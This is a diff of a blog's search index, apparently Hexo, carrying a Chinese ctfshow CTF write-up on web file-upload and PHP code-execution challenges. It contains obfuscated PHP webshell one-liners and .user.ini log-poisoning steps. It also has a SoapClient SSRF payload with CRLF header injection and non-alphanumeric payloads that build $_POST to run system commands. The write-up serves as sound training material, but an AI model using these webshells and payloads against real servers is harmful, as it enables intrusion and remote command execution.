class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//c相当于system,给1赋值参数即可</span></span><br><span class="line"> </span><br><span class="line">脚本<span class="number">5</span>:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="title function_ invoke__">substr</span>(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>; <span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">脚本<span class="number">6</span>:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="title function_ invoke__">strrev</span>(<span class="string">&#x27;metsys&#x27;</span>); <span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">脚本<span class="number">7</span>:</span><br><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;abs&#125;)(<span class="variable">$$pi</span>&#123;acos&#125;);</span><br><span class="line"><span class="comment">#数字函数  get传参   abs=system&amp;acos=tac ../flagaa.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603225422093.png" class="" title="image-20240603225422093">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603225422093.png" class="" title="image-20240603225422093">
 
 <p>随后访问&#x2F;upload&#x2F;1.php页面</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603225442644.png" class="" title="image-20240603225442644">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603225442644.png" class="" title="image-20240603225442644">
 
 <p>开始命令执行</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603225503571.png" class="" title="image-20240603225503571">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603225503571.png" class="" title="image-20240603225503571">
 
 <p>在flagaa.php中找到flag</p>
 </blockquote>
 <h2 id="web169（高级免杀）"><a href="#web169（高级免杀）" class="headerlink" title="web169（高级免杀）"></a>web169（高级免杀）</h2><blockquote>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603225955933.png" class="" title="image-20240603225955933">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603225955933.png" class="" title="image-20240603225955933">
 
 <p>上传zip文件，但是上传不上去，后面看了WP发现是要改为image&#x2F;png类型，后端的MIME检查</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603230242852.png" class="" title="image-20240603230242852">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603230242852.png" class="" title="image-20240603230242852">
 
 <p>也不知道是如何在这么多东西中找到的</p>
 <p>这次过滤了很多符号，&lt;&gt;$等</p>
 <p>采用日志上传</p>
 <p>首先上传.user.ini文件</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603230728064.png" class="" title="image-20240603230728064">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603230728064.png" class="" title="image-20240603230728064">
 
 <p>再上传一个1.php文件，并且将User-Agent内容改为一句话</p>
 <p>随后再访问&#x2F;upload&#x2F;1.php</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603230915902.png" class="" title="image-20240603230915902">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603230915902.png" class="" title="image-20240603230915902">
 
 <p>随后开始命令执行即可</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603231106260.png" class="" title="image-20240603231106260">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603231106260.png" class="" title="image-20240603231106260">
 
 <p><strong>这题还可以使用远程文件包含来进行求解</strong></p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603231915043.png" class="" title="image-20240603231915043">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603231915043.png" class="" title="image-20240603231915043">
 </blockquote>
 <h2 id="web170（终极免杀）"><a href="#web170（终极免杀）" class="headerlink" title="web170（终极免杀）"></a>web170（终极免杀）</h2><blockquote>
 <p>用上一题一样的方法即可拿到flag</p>
@@ -1747,13 +1747,13 @@
 <p>然后运行下面的代码 </p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//token=ctfshow</span></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:7799&#x27;</span>));</span><br><span class="line"><span class="comment"># 创建一个对象，里面的参数第一个一般为null，第二个参数是数组形式，想要了解更多自行百度。</span></span><br><span class="line"><span class="variable">$client</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line"><span class="comment"># 这里我们调用一个不存在的方法来触发SoapClient类的__call函数，据我了解该默认__call函数会发送此请求给服务器。</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240609173816451.png" class="" title="image-20240609173816451">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240609173816451.png" class="" title="image-20240609173816451">
 
 <p> 我们还可以控制参数<code>User-Agent</code>，通过创建对象的时候添加参数<code>&#39;user_agent&#39;=&gt;$u</code>,具体看如下php代码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//token=ctfshow</span></span><br><span class="line"><span class="variable">$u</span> = <span class="string">&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type: application/x-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:7799&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$u</span>));</span><br><span class="line"><span class="variable">$client</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure>
 
 <p>里面的换行我们用<code>\r\n</code>表示而不是<code>\n\r</code>。因为我们要以post方式提交一个参数<code>token=ctfshow</code>，所以<code>Content-Type: application/x-www-form-urlencoded并Content-Length: 13\r\n\r\ntoken=ctfshow</code> 。而这里的<code>X-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1</code>是为了绕过那两次数组弹出元素。</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240609174127683.png" class="" title="image-20240609174127683">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240609174127683.png" class="" title="image-20240609174127683">
 
 <p> 发现没问题的话，我们就可以反序列化该对象，url编码，提交参数获取flag即可。这里注意将location修改为和我们的题目相关</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//token=ctfshow</span></span><br><span class="line"><span class="variable">$u</span> = <span class="string">&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$u</span>));</span><br><span class="line"><span class="comment">//$client-&gt;getFlag();</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>));</span><br></pre></td></tr></table></figure>
@@ -1781,11 +1781,11 @@
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从题目可以看出post传参被正则限制的厉害，想着同时进行get传参，但是限制了post参数长度(&lt;=105)。使非数字绕过，_/_非法运算时返回NAN，通过变量自增，组装$*POST[*]，以便达到post传参，执行远程命令。</span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/12cfcc928d7e41d9ac3ea67f8e8a8b25.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/12cfcc928d7e41d9ac3ea67f8e8a8b25.png" class="" title="img">
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/b1ab92f57e604920b26d97014c59b706.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/b1ab92f57e604920b26d97014c59b706.png" class="" title="img">
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/c85ea9e2bc9e4dc1b2a47510a610ad7c.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/c85ea9e2bc9e4dc1b2a47510a610ad7c.png" class="" title="img">
 
 <p>注意：之前好奇为啥 $d1 &#x3D;<br>‘ab’.‘cd’[0]，输出值为”abc”，这里涉及到运算优先级问题，‘cd’[0]的值为”c”，再和前面的’ab’拼接后，即”abc”。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(_/_._)[<span class="number">0</span>];  <span class="comment">//$_变量的值为&quot;NAN_&quot;[0]的值，即值为&quot;N&quot;</span></span><br><span class="line"><span class="variable">$_0</span>=++<span class="variable">$_</span>;       <span class="comment">//$_变量自增后，值为&quot;O&quot;,且再赋值给变量$_0，且其值为&quot;O&quot;</span></span><br><span class="line"><span class="variable">$_0</span>=++<span class="variable">$_</span>.<span class="variable">$_0</span>;   <span class="comment">//$_变量增增后，值为&quot;P&quot;,再拼接变量$_0的值&quot;O&quot;,再赋值给变量$_0,即值为&quot;PO&quot;</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;      <span class="comment">//$_变量增增后，值为&quot;Q&quot;、&quot;R&quot;</span></span><br><span class="line"><span class="variable">$_0</span>.=++<span class="variable">$_</span>;      <span class="comment">//变量$_0变量的值为&quot;PO&quot;,再拼接$_变量增增后的值&quot;S&quot;，再赋值给变量$_0,即值为&quot;POS&quot;</span></span><br><span class="line"><span class="variable">$_0</span>.=++<span class="variable">$_</span>;      <span class="comment">//变量$_0变量的值为&quot;POS&quot;,再拼接$_变量增增后的值&quot;T&quot;，再赋值给变量$_0,即值为&quot;POST&quot;</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_0</span>;       <span class="comment">//变量$_重新赋值为&quot;_&quot;拼接变量$_0的值&quot;POST&quot;,即值为&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]); <span class="comment">//替换$_0变量的值&quot;_POST&quot;后，即组装出 $_POST[0]($_POST[1])，以便post传参，参数名为0和1，如0参数传参为system，1参数传参为ls /，即post传参后拼接出system(&#x27;ls /&#x27;)命令，以便eval去执行。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//post传参，注意在&amp;0=system&amp;1=ls /之前的要用url编码，要不然+号会被识别为空格</span></span><br><span class="line">ctf_show=<span class="variable">$_</span>=(_/_._)[<span class="number">0</span>];<span class="variable">$_0</span>=++<span class="variable">$_</span>;<span class="variable">$_0</span>=++<span class="variable">$_</span>.<span class="variable">$_0</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;<span class="variable">$_0</span>.=++<span class="variable">$_</span>;<span class="variable">$_0</span>.=++<span class="variable">$_</span>;<span class="variable">$_</span>=_.<span class="variable">$_0</span>;<span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=ls /</span><br><span class="line">然后再cat /f1agaaa</span><br></pre></td></tr></table></figure>
@@ -1802,5 +1802,8 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctf_show=<span class="variable">$_</span>=(_/_._)[_];++<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;++<span class="variable">$_</span>;++<span class="variable">$_</span>;<span class="variable">$$_</span>[<span class="variable">$_</span>=_.<span class="variable">$__</span>.++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$_</span>[_]);&amp;_POST=system&amp;_=cat /f*</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
   </entry>
 </search>
